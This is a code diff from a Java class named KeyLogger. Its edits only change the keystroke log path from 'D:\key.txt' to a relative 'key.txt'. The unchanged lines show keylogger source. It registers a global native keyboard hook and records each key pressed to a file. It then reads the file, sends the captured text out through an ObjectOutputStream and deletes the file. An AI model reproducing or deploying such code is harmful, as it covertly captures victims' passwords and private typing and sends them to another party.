@@ -35,10 +35,10 @@ public class KeyLogger implements NativeKeyListener {
 		//myObj.delete();
 		System.out.println("Pressed");
 		record+=" "+NativeKeyEvent.getKeyText(e.getKeyCode());
-		myObj = new File("D:\\key.txt");
+		myObj = new File("key.txt");
 		FileWriter fileWriter = null;
 		try {
-			fileWriter = new FileWriter("D:\\key.txt");
+			fileWriter = new FileWriter("key.txt");
 		} catch (IOException e1) {
 			// TODO Auto-generated catch block
 			e1.printStackTrace();
@@ -68,9 +68,9 @@ public class KeyLogger implements NativeKeyListener {
 	}
 
 	public void get_Keylogger(ObjectOutputStream oos) throws IOException {
-		 myObj = new File("D:\\key.txt");
+		 myObj = new File("key.txt");
 		 FileWriter fileWriter;
-		 fileWriter = new FileWriter("D:\\key.txt");
+		 fileWriter = new FileWriter("key.txt");
 		 PrintWriter printWriter  = new PrintWriter(fileWriter);
 		 printWriter.print("1");           
 		 printWriter.close();
@@ -112,7 +112,7 @@ public class KeyLogger implements NativeKeyListener {
 
 		GlobalScreen.unregisterNativeHook();
 		//myObj = new File("D:\\key.txt");
-		Path fileName = Path.of("D:\\key.txt");
+		Path fileName = Path.of("key.txt");
 		content = Files.readString(fileName);
 		//System.out.println(content.length());
 		
@@ -124,11 +124,11 @@ public class KeyLogger implements NativeKeyListener {
 			
 	  
 	  	} else {
-	  	File file= new File("D:\\key.txt");
+	  	File file= new File("key.txt");
     	file.delete();
 		oos.writeObject(content);}
 	
-	    File file= new File("D:\\key.txt");
+	    File file= new File("key.txt");
 	    file.delete();
 	}
 }
